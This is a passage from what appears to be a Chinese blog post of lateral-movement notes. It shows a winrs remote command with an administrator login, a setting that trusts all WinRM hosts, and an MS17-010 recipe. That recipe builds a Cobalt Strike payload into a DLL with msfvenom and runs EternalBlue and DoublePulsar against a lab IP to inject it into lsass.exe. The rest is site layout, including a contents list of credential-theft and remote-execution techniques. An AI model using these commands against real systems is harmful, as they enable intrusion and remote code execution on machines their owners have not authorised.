+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs <span class="operator">-</span>r:http:<span class="operator">/</span><span class="operator">/</span>xxx.xxx.xxx.xxx:xxxx <span class="operator">-</span>u administrator <span class="operator">-</span>p:xxxxx &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p>如果出现例如客户端无法处理该请求，则输入 winrm set winrm&#x2F;config&#x2F;Client @{TrustedHosts&#x3D;”*”}</p>
+<h3 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h3><p>使用cs生成bin文件</p>
+<p>使用msf把bin文件变成dll文件,或者直接生成也行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="operator">-</span>p generic<span class="operator">/</span>custom PAYLOADFILE<span class="operator">=</span>.<span class="operator">/</span>payload.bin <span class="operator">-</span>a x64 <span class="comment">--platform windows -f dll -o wanli111.dll</span></span><br><span class="line">Eternalblue<span class="number">-2.2</span><span class="number">.0</span>.exe <span class="comment">--TargetIp 192.168.41.168 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig outlog.txt</span></span><br><span class="line">Doublepulsar<span class="number">-1.3</span><span class="number">.1</span>.exe <span class="comment">--InConfig Doublepulsar-1.3.1.xml --TargetIp 192.168.41.168 --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload 123.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</span></span><br></pre></td></tr></table></figure>
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">许木</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/posts/039900e735dd/">http://example.com/posts/039900e735dd/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">自己愛的な人です</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://i.postimg.cc/qMyfS0yP/henxaing.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/d2fb2fe6444a/" title="提权"><img class="cover" src="https://i.postimg.cc/PrQM7FVX/tiquan.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">提权</div></div></a></div><div class="next-post pull-right"><a href="/posts/e1a9176bc199/" title="谢罪篇"><img class="cover" src="https://i.postimg.cc/gk14PWcW/R-C.gif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">谢罪篇</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/b14b406e218d/" title="一次渗透题目回顾"><img class="cover" src="https://i.postimg.cc/HsFMjFXv/62dd556d1ccb1c9d588ccfe64d299a3b.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-11</div><div class="title">一次渗透题目回顾</div></div></a></div><div><a href="/posts/d2fb2fe6444a/" title="提权"><img class="cover" src="https://i.postimg.cc/PrQM7FVX/tiquan.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-17</div><div class="title">提权</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.postimg.cc/CxGRhTpQ/e08087412710590d39be232cd643f10f.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">许木</div><div class="author-info__description">闭嘴！再叫就打你嘴里</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xudamu"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xudamu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://xudamu.github.io/atom.xml" target="_blank" title=""><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#RustDESK"><span class="toc-number">1.</span> <span class="toc-text">RustDESK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GoToHTTP-%E8%A6%81%E9%92%B1"><span class="toc-number">2.</span> <span class="toc-text">GoToHTTP(要钱)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#todesk%E7%AF%87-%E4%BC%9A%E8%A2%AB%E6%8A%A5%E8%AD%A6%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%94%A8%E7%9A%84%E5%A4%AA%E5%A4%9A%E4%BA%86"><span class="toc-number">3.</span> <span class="toc-text">todesk篇(会被报警，因为用的太多了)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%91%E6%97%A5%E8%91%B5%E7%AF%87%EF%BC%88%E6%BC%8F%E6%B4%9E%E5%B7%B2%E5%A4%B1%E6%95%88%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E6%9B%BF%E6%8D%A2%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">向日葵篇（漏洞已失效，但是可以进行文件替换）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E7%8E%AF%E5%A2%83%E5%8F%AF%E8%83%BD%E5%8F%AA%E6%9C%89%E8%80%81%E7%94%B5%E8%84%91%E8%83%BD%E8%B7%91"><span class="toc-number">5.</span> <span class="toc-text">计划任务横向移动(环境可能只有老电脑能跑)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">6.</span> <span class="toc-text">系统服务横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Spraying%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB%E5%92%8C%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE-%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7"><span class="toc-number">7.</span> <span class="toc-text">Password Spraying密码喷洒攻击和域内用户枚举(枚举用户)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH-Pass-the-Hash-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92-%E9%87%8D%E8%A6%81"><span class="toc-number">8.</span> <span class="toc-text">PTH(Pass the Hash)哈希传递(重要)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">8.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">8.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Key-PTK-%E5%AF%86%E9%92%A5%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">9.</span> <span class="toc-text">Pass the Key(PTK)密钥传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#KB2871997"><span class="toc-number">9.0.1.</span> <span class="toc-text">KB2871997</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%EF%BC%9A"><span class="toc-number">9.1.</span> <span class="toc-text">操作：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-The-Ticket-PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB-%E7%BB%B4%E6%9D%83%E7%94%A8%E7%9A%84"><span class="toc-number">10.</span> <span class="toc-text">Pass The Ticket(PTT)票据传递攻击(维权用的)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8"><span class="toc-number">10.1.</span> <span class="toc-text">手动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8CS"><span class="toc-number">10.2.</span> <span class="toc-text">用CS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068"><span class="toc-number">11.</span> <span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#goldenPac-exe"><span class="toc-number">12.</span> <span class="toc-text">goldenPac.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PsExec%E5%B7%A5%E5%85%B7%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E8%80%81%E4%BA%86%EF%BC%8C%E8%A2%AB%E6%9D%80%E8%BD%AF%E7%9B%AF%E6%AD%BB%E4%BA%86%EF%BC%8C%E8%80%8C%E4%B8%94%E6%97%A5%E5%BF%97%E5%A4%AA%E5%A4%9A"><span class="toc-number">13.</span> <span class="toc-text">PsExec工具远程命令执行横向移动(老了，被杀软盯死了，而且日志太多)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E6%97%A0%E6%97%A5%E5%BF%97%EF%BC%8C%E6%9E%81%E5%A5%BD%E7%94%A8"><span class="toc-number">14.</span> <span class="toc-text">WMIC远程执行命令横向移动(无日志，极好用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec%E5%B7%A5%E5%85%B7%EF%BC%88%E4%BC%9A%E8%A2%ABwindows-defender%E6%8C%A1%EF%BC%89"><span class="toc-number">15.</span> <span class="toc-text">wmiexec工具（会被windows defender挡）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%8D%E8%83%BD%E5%9C%A8cs%E9%87%8C%E9%9D%A2%E7%94%A8%EF%BC%8C%E5%BE%97%E6%8B%BF%E5%88%B0%E6%9C%BA%E5%99%A8%E6%89%8D%E8%83%BD%E7%94%A8%EF%BC%89"><span class="toc-number">16.</span> <span class="toc-text">SMB远程代码执行（不能在cs里面用，得拿到机器才能用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCOM%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">17.</span> <span class="toc-text">DCOM远程命令横向移动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">18.</span> <span class="toc-text">WinRM远程执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms17-010"><span class="toc-number">19.</span> <span class="toc-text">ms17-010</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/d2fb2fe6444a/" title="提权"><img src="https://i.postimg.cc/PrQM7FVX/tiquan.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="提权"/></a><div class="content"><a class="title" href="/posts/d2fb2fe6444a/" title="提权">提权</a><time datetime="2024-10-17T09:32:00.000Z" title="发表于 2024-10-17 17:32:00">2024-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/039900e735dd/" title="横向移动"><img src="https://i.postimg.cc/qMyfS0yP/henxaing.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="横向移动"/></a><div class="content"><a class="title" href="/posts/039900e735dd/" title="横向移动">横向移动</a><time datetime="2024-10-17T08:59:42.000Z" title="发表于 2024-10-17 16:59:42">2024-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e1a9176bc199/" title="谢罪篇"><img src="https://i.postimg.cc/gk14PWcW/R-C.gif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="谢罪篇"/></a><div class="content"><a class="title" href="/posts/e1a9176bc199/" title="谢罪篇">谢罪篇</a><time datetime="2024-10-17T07:50:49.000Z" title="发表于 2024-10-17 15:50:49">2024-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/335ca95a5110/" title="给博客创建 RSS 订阅源的三种方法"><img src="https://i.postimg.cc/J0ZcrbTn/rsshub.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="给博客创建 RSS 订阅源的三种方法"/></a><div class="content"><a class="title" href="/posts/335ca95a5110/" title="给博客创建 RSS 订阅源的三种方法">给博客创建 RSS 订阅源的三种方法</a><time datetime="2024-08-14T00:16:20.000Z" title="发表于 2024-08-14 08:16:20">2024-08-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/0a3e0b83a0aa/" title="考核须知"><img src="https://i.postimg.cc/VkpQWPdw/QQ-20240811224914.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="考核须知"/></a><div class="content"><a class="title" href="/posts/0a3e0b83a0aa/" title="考核须知">考核须知</a><time datetime="2024-08-11T14:30:04.000Z" title="发表于 2024-08-11 22:30:04">2024-08-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By 许木</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script src="/js/universe.js"></script><canvas id="live2d"></canvas><script src="/styles/fish.js"></script><script type="text/javascript"> var resourcesPath = 'https://cdn.jsdelivr.net/gh/xudamu/Doro@for_blog/';var backImageName = '';var modelDir = ['Doro']; initDefine(resourcesPath, backImageName, modelDir); </script><script>document.getElementById('live2d').setAttribute('height', '300');</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
